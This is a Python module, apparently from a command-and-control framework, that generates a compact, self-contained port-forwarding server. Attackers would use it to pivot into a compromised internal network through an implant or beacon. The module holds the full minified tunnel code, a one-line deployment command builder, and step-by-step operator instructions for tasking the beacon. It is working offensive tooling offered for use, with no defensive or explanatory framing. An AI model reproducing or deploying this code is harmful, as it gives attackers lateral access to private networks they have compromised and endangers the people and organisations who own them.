"""
@module: protfwd_server
@desc: 生成端口转发服务端一键部署代码: 部署到公网服务器后监听转发端口
(操作员连接) 与隧道端口(植入物连接), 经植入物把目标内网端口映射到
公网服务器本地。操作员连转发端口 → 服务端经隧道下发 CONNECT(目标内嵌)
→ 植入物连目标 → 双向转发。
@params: listen_port target_host target_port [tunnel_port] [out_dir]
"""
import os

from server.core.bootstrap import deploy_command

MODULE = {
    "desc": "生成端口转发服务端一键部署代码(独立部署, 目标端口内嵌)",
    "params": [
        ("listen_port", "必填；转发端口(操作员连接)"),
        ("target_host", "必填；目标主机(植入物内网可达)"),
        ("target_port", "必填；目标端口"),
        ("tunnel_port", "可选；隧道端口(植入物连接),默认 listen_port+1"),
        ("out_dir", "默认 s_modules/output"),
    ],
}

_SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "output")

# 部署机自包含转发服务端代码(纯 stdlib)。短名节省载荷体积。
_CODE = '''\
import socket as s,threading as t,os
LP={lp};TP={tp};TH='{th}';TPT={tpt};PEND={{}};CTRL=[]
def _f(a,b):
 def g(x,d):
  try:
   while 1:
    y=x.recv(65536)
    if not y:break
    d.sendall(y)
  except:pass
  finally:
   try:d.shutdown(2)
   except:pass
 t.Thread(target=g,args=(a,b),daemon=True).start();g(b,a)
def _cs(l):
 for c in list(CTRL):
  try:c.sendall(l.encode())
  except:
   try:CTRL.remove(c)
   except:pass
def _h(c):
 c.settimeout(120)
 try:
  d=c.recv(4096).decode(errors='replace').strip()
  if d.startswith('REG '):
   CTRL.append(c)
   while 1:
    if not c.recv(4096):break
   try:CTRL.remove(c)
   except:pass
  elif d.startswith('HELLO '):
   k=d.split()[2];cl=PEND.pop(k,None)
   if cl:_f(cl,c)
 except:pass
 finally:
  try:c.close()
  except:pass
def _tun():
 ls=s.socket();ls.setsockopt(1,2,1);ls.bind(('0.0.0.0',TP));ls.listen(64)
 while 1:
  try:c,_=ls.accept()
  except:break
  t.Thread(target=_h,args=(c,),daemon=True).start()
def _fwd():
 ls=s.socket();ls.setsockopt(1,2,1);ls.bind(('0.0.0.0',LP));ls.listen(64)
 while 1:
  try:c,_=ls.accept()
  except:break
  k=os.urandom(8).hex();PEND[k]=c
  _cs('CONN %s %s %d\\n'%(k,TH,TPT))
t.Thread(target=_tun,daemon=True).start();_fwd()
'''


def run(listen_port, target_host, target_port, tunnel_port=None, out_dir=None):
    """生成端口转发服务端代码与一键部署命令。"""
    lp = int(listen_port)
    tpt = int(target_port)
    tp = int(tunnel_port) if tunnel_port else lp + 1
    out_dir = out_dir or _DEFAULT_OUT
    os.makedirs(out_dir, exist_ok=True)
    code = _CODE.format(lp=lp, tp=tp, th=target_host, tpt=tpt)
    compile(code, "<protfwd_server>", "exec")  # 生成即校验
    command = deploy_command(code)
    cmd_file = os.path.join(out_dir, "protfwd_server_command.txt")
    with open(cmd_file, "w", encoding="utf-8") as f:
        f.write(command + "\n")
    return {
        "status": "ok",
        "listen_port": lp,
        "tunnel_port": tp,
        "target": f"{target_host}:{tpt}",
        "command": command,
        "code_len": len(code),
        "usage": (f"1) 把上面 command 部署到公网服务器(echo ... | python3)\n"
                  f"2) 下发植入物端: s_exec portfwd {tp} 后把生成代码下发 beacon 执行\n"
                  f"3) 操作机连 <server_ip>:{lp} 即到达 {target_host}:{tpt}\n"
                  f"4) 停止服务端后植入物 portfwd 线程自动退出"),
    }
